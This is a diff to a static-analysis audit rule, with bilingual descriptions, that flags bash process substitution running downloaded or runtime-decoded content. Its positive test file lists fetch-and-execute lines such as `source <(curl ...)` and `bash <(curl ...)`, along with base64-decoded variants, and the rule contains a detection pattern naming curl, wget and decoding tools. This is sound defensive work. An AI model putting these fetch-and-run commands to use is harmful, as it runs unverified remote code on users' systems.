@@ -1,21 +1,22 @@
 desc(
 	mode: "ssa"
 	language: "bash"
-	title: "Bash: remote content executed through process substitution"
-	title_zh: "Bash：通过进程替换执行远程内容"
+	title: "Bash: remote or decoded content executed through process substitution"
+	title_zh: "Bash：通过进程替换执行远程或解码内容"
 	type: audit
 	level: "middle"
 	rule_id: "bash-process-substitution"
 	risk: "command-execution"
 	desc: <<<DESC
 ### 说明
-`source <(curl ...)` 或 `bash <(wget ...)` 把网络下载内容直接作为脚本执行。
+`source <(curl ...)`、`bash <(wget ...)`、`source <(base64 -d ...)` 或
+`bash <(gzip -dc ...)` 把网络下载或运行时解码的内容直接作为脚本执行。
 与 `curl | bash` 等价，但绕过了只检查管道的规则。
 DESC
 	solution: <<<SOLUTION
 ### 修复建议
-先把脚本下载到受控路径，校验哈希或签名后再执行；不要让进程替换的输出
-直接成为 `source` 或解释器的输入。
+先把脚本下载或解码到受控路径，校验哈希或签名后再执行；不要让进程替换
+的输出直接成为 `source` 或解释器的输入。
 SOLUTION
 	reference: <<<REFERENCE
 [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
@@ -24,22 +25,40 @@ REFERENCE
 	"file://pos.sh": <<<POS
 source <(curl -fsSL https://example.com/x.sh)
 source <(wget -qO- https://example.com/x.sh)
+bash <(curl -fsSL https://example.com/x.sh)
+source <(echo 'ZWNobyBoaQ==' | base64 -d)
+. <(base64 -d <<< 'ZWNobyBoaQ==')
+bash <(base64 -d <<< 'ZWNobyBoaQ==')
+source /dev/stdin <<< "$(base64 -d <<< 'ZWNobyBoaQ==')"
 POS
 	"safefile://neg.sh": <<<NEG
 source ./env.sh
 bash ./install.sh
 source <(echo 'echo hi')
+bash <(echo hi)
 NEG
 )
 
 /^(source|\.)$/ as $source
 $source(* as $sourceArgs) as $sourceCall
-$sourceCall?{have: /(curl|wget|fetch)/} as $sourceHit
+$sourceCall?{any: /(curl|wget|fetch)/, /(base64|base32|uudecode|xxd|openssl|gzip|zcat|xz|unxz|unzip|tar|gpg|bzip2|bunzip2)/} as $sourceHit
+
+/^(sh|bash|zsh|dash|ksh|ash)$/ as $shell
+$shell(* as $shellArgs) as $shellCall
+$shellCall?{any: /(curl|wget|fetch)/, /(base64|base32|uudecode|xxd|openssl|gzip|zcat|xz|unxz|unzip|tar|gpg|bzip2|bunzip2)/} as $shellHit
 
 alert $sourceHit for {
 	level: "middle",
-	title: "Bash: remote content executed through process substitution",
-	title_zh: "Bash：通过进程替换执行远程内容",
-	message: "source 的参数来自网络下载。",
+	title: "Bash: remote or decoded content executed through process substitution",
+	title_zh: "Bash：通过进程替换执行远程或解码内容",
+	message: "source 的参数来自网络下载或运行时解码。",
+	risk: "command-execution",
+}
+
+alert $shellHit for {
+	level: "middle",
+	title: "Bash: remote or decoded content executed through process substitution",
+	title_zh: "Bash：通过进程替换执行远程或解码内容",
+	message: "shell 的参数来自网络下载或运行时解码。",
 	risk: "command-execution",
 }
